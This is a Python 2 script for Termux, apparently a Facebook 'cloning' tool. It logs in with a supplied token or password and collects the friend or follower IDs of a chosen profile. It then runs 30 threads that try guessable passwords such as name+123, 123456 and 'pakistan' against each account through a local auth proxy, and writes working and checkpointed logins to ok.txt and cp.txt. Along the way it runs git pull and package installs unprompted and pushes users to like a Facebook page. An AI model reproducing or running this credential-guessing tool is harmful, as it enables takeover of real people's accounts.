#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#real codding by Tech abm
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("pip2 install mechazine")
    os.system("pip2 install lolcat")
    os.system("python2 rms.py")
os.system("clear")
"""
try:
    my = requests.get("https://m.facebook.com/Techabm")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;97mTurn on mobile data\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 infect.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby"):
    os.system("apt install ruby -y && gem install lolcat")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/file/malik/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd malik && npm install")
    os.system("cd malik && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://m.facebook.com/Techabm")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/file/malik/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd malik && node index.js &")
    os.system("clear")
    print("")
    print("")
    print("")
    print("")
    print("\t\033[1;97mPlease like our page to continue")
    print("")
    print("")
    print("")
    print("")
    os.system("xdg-open https://m.facebook.com/Techabm")
    time.sleep(10)
    print("")
    print("")
    print("")
    print("")
    print("\t Press Allow to storage permission")
    print("")
    print("")
    print("")
    print("")
    os.system("termux setup storage")  # give storage permission
    time.sleep(5)
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
def logo():
    os.system('echo -e "\n      \x1b[0;32m #     #    #    #       ### #    #  \n      \x1b[0;33m ##   ##   # #   #        #  #   #   \n      \x1b[0;33m # # # #  #   #  #        #  #  #    \n       \x1b[0;34m#  #  # #     # #        #  ###     \n      \x1b[0;35m #     # ####### #        #  #  # \n      \x1b[0;35m #     # #     # #        #  #   #\n       \x1b[0;33m#     # #     # ####### ### #    #     \n        \x1b[0m\n\x1b[1;93m-----------------------------------------------\n\x1b[0;34m\xe2\x8b\x9f\x1b[0;32m Creator      : \x1b[0;33m Malik Asghar Latif  \n\x1b[0;34m\xe2\x8b\x9f \x1b[0;32mFacebook ID  :  \x1b[0;33mAsghar Latif                     \x1b[0m\n\x1b[1;93m-----------------------------------------------" | lolcat')
def tech_abm():
    os.system("clear")
    logo()
    print("")
    print("")
    print("")
    print("")
    os.system('echo -e "\t Welcome       "| lolcat')
    print("")
    print("")
    print("")
    print("")
    time.sleep(5)
    os.system("clear")
    logo()
    print("")
    print("")
    print("")
    print("")
    os.system('echo -e "\t Welcome Bro       "| lolcat')
    print("")
    print("")
    print("")
    print("")
    time.sleep(5)
    os.system("clear")
    logo()
    os.system("git pull")
    time.sleep(2)
    os.system("clear")
    logo()
    os.system('echo -e "[1] Start Cloning (Api Method)               "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    tech_abm_select()
def tech_abm_select():
    abm = raw_input("\n╰─➤  ")
    if abm =="1":
        b_menu()
    else:
        os.system('echo -e "\t    \033[1;31mSelect a valid option "| lolcat')
        tech_abm_select()
def login():
    os.system("clear")
    logo()
    os.system('echo -e "[1] login with access token   "| lolcat')
    os.system('echo -e "[2] login with user and pass "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    login_select()
def login_select():
    abm = raw_input("\n╰─➤ ")
    if abm =="1":
        os.system("clear")
        logo()
        os.system('echo -e " \t    \033[1;32mlogin with token\033[0;97m "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
        token = raw_input(" Token : ")
	os.system('echo -e "-----------------------------------------------"| lolcat')
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            tech_abm()
        except (KeyError , IOError):
            os.system('echo -e " \t    \033[1;31mToken not valid\033[0;97m "| lolcat')
            raw_input(" Press enter to try again ")
            login()
    elif abm =="2":
        login_fb()
    else:
        print("\t    "+c+"Select valid method"+c2)
        login_select()
def login_fb():
	os.system("clear")
	logo()
	os.system('echo -e " \t    \033[1;32mlogin with password\033[0;97m "| lolcat')
	os.system('echo -e " \t    \033[1;32muse any proxy to login\033[0;97m "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	os.system('echo -e "-----------------------------------------------"| lolcat')
	logging()
	data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".login.txt","w")
            succ.write(q["access_token"])
            succ.close()
            os.system('echo -e " \n\033[1;92m[✓] Login Successfull\033[0;97m "| lolcat')
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                os.system('echo -e " \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "| lolcat')
                time.sleep(1)
                login_fb()
            else:
                os.system('echo -e "\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "| lolcat')
                time.sleep(1)
                login_fb()
def b_menu():
    global token
    os.system("clear")
    logo()
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"ID has checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        os.system('echo -e " \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "| lolcat')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    logo()
    print("\t  "+c+"User ID"+ok+c2)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    os.system('echo -e "[1] Clone From Public friends "| lolcat')
    os.system('echo -e "[2] Clone From Followers "| lolcat')
    os.system('echo -e "[0] Logout "| lolcat')
    os.system('echo -e "-----------------------------------------------"| lolcat')
    b_menu_select()
def b_menu_select():
	abm = raw_input("\n╰─➤ ")
	id=[]
	oks=[]
	cps=[]
	if abm =="1":
		os.system("clear")
		logo()
		os.system('echo -e "\t    Public ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Enter ID username :  ")
		os.system('echo -e "-----------------------------------------------"| lolcat')
		time.sleep(2)
		os.system("clear")
		logo()
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Public ID Menu " | lolcat')
			os.system('echo -e "-----------------------------------------------"| lolcat')
			print(" User ID : "+q["name"])
		except (KeyError , IOError):
		    os.system('echo -e " \n\t    \033[1;31m Logged in id has been checkpoint\033[0;97m "| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif abm =="2":
		os.system("clear")
		logo()
		os.system('echo -e "\t    Followers ID Menu " | lolcat')
		os.system('echo -e "-----------------------------------------------"| lolcat')
		idt = raw_input(" Enter ID/Username : ")
		time.sleep(2)
		os.system("clear")
		logo()
		print("")
		print("")
		print("")
		os.system('echo -e "\t    Please Wait " | lolcat')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			logo()
			os.system('echo -e "\t    Followers ID Menu" | lolcat')
			print(" User ID : "+q["name"])
			os.system('echo -e "-----------------------------------------------"| lolcat')
		except (KeyError , IOError):
		    os.system('echo -e " \t    \033[1;31m Logged in id has been checkpoint\033[0;97m"| lolcat')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			
	print(" Total IDs   : "+str(len(id)))
	time.sleep(2)
	os.system("clear")
	logo()
	os.system('echo -e "Use Airoplane mode if nothing is working "| lolcat')
	
	os.system('echo -e "Cloning Start... "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	print("")
	print 47*("-")
	print('')
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+"123"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("[Checkpoint] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"1234"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("[Checkpoint] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"12345"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("[Checkpoint] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"786"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("[Checkpoint] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = "786786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("[Checkpoint] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "123456"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("[Checkpoint] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "pakistan"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;32m[Successful] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("[Checkpoint] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print("")
	print(47*"-")
	print("")
	print(" The process has completed")
	print(" Total Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
	print("")
	print(47*"-")
	print("")
	raw_input(" Press entet to back ")

b_menu()

if __name__ == '__main__':
    tech_abm()
